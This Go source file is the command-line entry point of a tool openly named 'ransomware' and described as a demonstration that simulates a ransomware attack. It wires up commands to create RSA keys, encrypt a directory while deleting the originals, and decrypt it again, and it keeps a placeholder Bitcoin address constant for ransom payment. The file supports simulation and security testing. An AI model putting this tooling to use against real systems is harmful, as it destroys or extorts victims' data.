package main

import (
	"log"
	"os"
	"time"

	"github.com/common-nighthawk/go-figure"
	"github.com/marmos91/ransomware/cli"
	urfavecli "github.com/urfave/cli/v2"
)

const APP_NAME = "ransomware"
const APP_DESCRIPTION = "A simple demonstration tool to simulate a ransomware attack"
const APP_VERSION = "v1.0.0"
const BITCOIN_ADDRESS = "BITCOIN_ADDRESS"

func SplashScreen(silent bool) func(*urfavecli.Context) error {
	return func(ctx *urfavecli.Context) error {
		if !silent {
			figure.NewFigure(APP_NAME, "graffiti", true).Print()
		}

		return nil
	}
}

func main() {
	var silent bool

	app := &urfavecli.App{
		Name:     APP_NAME,
		Usage:    APP_DESCRIPTION,
		Version:  APP_VERSION,
		Compiled: time.Now(),
		Authors: []*urfavecli.Author{
			{
				Name:  "Marco Moschettini",
				Email: "marco.moschettini@cubbit.io",
			},
		},
		Flags: []urfavecli.Flag{
			&urfavecli.BoolFlag{
				Name:        "silent",
				Usage:       "Runs the tool in silent mode (no logs)",
				Destination: &silent,
				Value:       false,
			},
		},
		Commands: []*urfavecli.Command{
			{
				Name:    "create-keys",
				Aliases: []string{"c"},
				Usage:   "Generates a new random keypair and saves it to a file",
				Before:  SplashScreen(silent),
				Flags: []urfavecli.Flag{
					&urfavecli.StringFlag{
						Name:    "path",
						Aliases: []string{"p"},
						Usage:   "The path where to save the keys",
						Value:   ".",
					},
				},
				Action: cli.CreateKeys,
			},
			{
				Name:    "encrypt",
				Usage:   "Encrypts a directory",
				Aliases: []string{"e"},
				Flags: []urfavecli.Flag{
					&urfavecli.StringFlag{
						Name:     "path",
						Aliases:  []string{"p"},
						Usage:    "Runs the tool on a directory",
						Required: true,
					},
					&urfavecli.StringFlag{
						Name:     "publicKey",
						Usage:    "Loads the provided RSA public key in PEM format",
						Required: true,
					},
					&urfavecli.StringFlag{
						Name:  "extBlacklist",
						Usage: "the extension to blacklist",
						Value: ".enc",
					},
					&urfavecli.StringFlag{
						Name:  "extWhitelist",
						Usage: "the extension to whitelist",
						Value: "",
					},
					&urfavecli.BoolFlag{
						Name:  "skipHidden",
						Usage: "skips hidden folders",
						Value: false,
					},
					&urfavecli.BoolFlag{
						Name:  "dryRun",
						Usage: "encrypts files without deleting originals",
						Value: false,
					},
					&urfavecli.StringFlag{
						Name:  "encSuffix",
						Usage: "defines the suffix to add to encrypted files",
						Value: ".enc",
					},
				},
				Before: SplashScreen(silent),
				Action: cli.Encrypt,
			},
			{
				Name:    "decrypt",
				Usage:   "Decrypts a directory",
				Aliases: []string{"d"},
				Flags: []urfavecli.Flag{
					&urfavecli.StringFlag{
						Name:     "path",
						Aliases:  []string{"c"},
						Usage:    "Runs the tool on a directory",
						Required: true,
					},
					&urfavecli.StringFlag{
						Name:     "privateKey",
						Usage:    "Loads the provided RSA private key in PEM format",
						Required: true,
					},
					&urfavecli.BoolFlag{
						Name:  "dryRun",
						Usage: "decrypts files without deleting encrypted versions",
						Value: false,
					},
					&urfavecli.StringFlag{
						Name:  "encSuffix",
						Usage: "defines the suffix to add to encrypted files",
						Value: ".enc",
					},
				},
				Before: SplashScreen(silent),
				Action: cli.Decrypt,
			},
		},
	}

	if err := app.Run(os.Args); err != nil {
		log.Fatal(err)
	}
}
